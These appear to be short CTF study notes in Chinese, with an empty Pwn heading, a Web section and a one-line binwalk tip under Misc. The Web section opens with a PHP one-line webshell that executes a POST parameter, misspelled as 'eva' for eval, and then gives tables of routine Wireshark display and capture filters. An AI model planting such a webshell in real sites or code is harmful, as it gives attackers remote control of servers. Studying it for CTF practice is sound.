# CTF

## Pwn



## Web

- 一句话木马

```php
<?php @eva($_POST['attack']); ?>
```

### Wireshark 常用过滤器

> 显示过滤器：抓包完成后筛选显示符合条件的数据包。

| 分类             | 命令                                           | 说明                  |
| ---------------- | ---------------------------------------------- | --------------------- |
| **IP 过滤**      | `ip.addr == 192.168.1.1`                       | 任意端为该 IP         |
|                  | `ip.src == 192.168.1.1`                        | 来源 IP               |
|                  | `ip.dst == 192.168.1.1`                        | 目的 IP               |
| **端口过滤**     | `tcp.port == 80`                               | 任意端口为 80         |
|                  | `tcp.srcport == 443`                           | 来源端口为 443        |
|                  | `tcp.dstport == 443`                           | 目的端口为 443        |
|                  | `udp.port == 53`                               | DNS 端口              |
| **协议过滤**     | `http`                                         | HTTP 协议             |
|                  | `dns`                                          | DNS 协议              |
|                  | `tcp` / `udp` / `icmp`                         | 常用协议过滤          |
|                  | `tls` / `ssl`                                  | 加密流量              |
| **内容匹配**     | `tcp contains "login"`                         | TCP 数据包包含字符串  |
|                  | `http.request.uri contains "index"`            | URI 包含 index        |
| **长度过滤**     | `frame.len > 500`                              | 包长大于 500 字节     |
| **TCP 状态过滤** | `tcp.flags.syn == 1 && tcp.flags.ack == 0`     | TCP SYN（握手第一步） |
| **组合逻辑**     | `ip.src == 192.168.1.1 and tcp.dstport == 443` | 来源 + 目的端口       |
|                  | `http or dns`                                  | HTTP 或 DNS           |
|                  | `not tcp`                                      | 排除 TCP 流量         |

> 捕获过滤器：抓包前设定，减少捕获的数据量。

| 分类         | 命令                            | 说明                |
| ------------ | ------------------------------- | ------------------- |
| **IP 过滤**  | `host 192.168.1.1`              | 任意端为该 IP       |
|              | `src host 192.168.1.1`          | 来源 IP             |
|              | `dst host 192.168.1.1`          | 目的 IP             |
| **网段过滤** | `net 192.168.1.0/24`            | 过滤整个网段        |
|              | `src net 10.0.0.0/8`            | 来源为内网 10.x.x.x |
| **端口过滤** | `port 80`                       | 任意端口 80         |
|              | `tcp port 443`                  | TCP 443 端口        |
|              | `udp port 53`                   | UDP 53 端口         |
| **协议过滤** | `tcp`                           | 捕获 TCP            |
|              | `udp`                           | 捕获 UDP            |
|              | `icmp`                          | 捕获 ICMP           |
| **排除流量** | `not port 22`                   | 排除 SSH 流量       |
| **组合逻辑** | `host 192.168.1.10 and port 80` | IP + 端口           |
|              | `tcp and not port 443`          | TCP 且排除 443      |

## Misc

- binwalk：隐写在图片中的图片、音频、压缩包
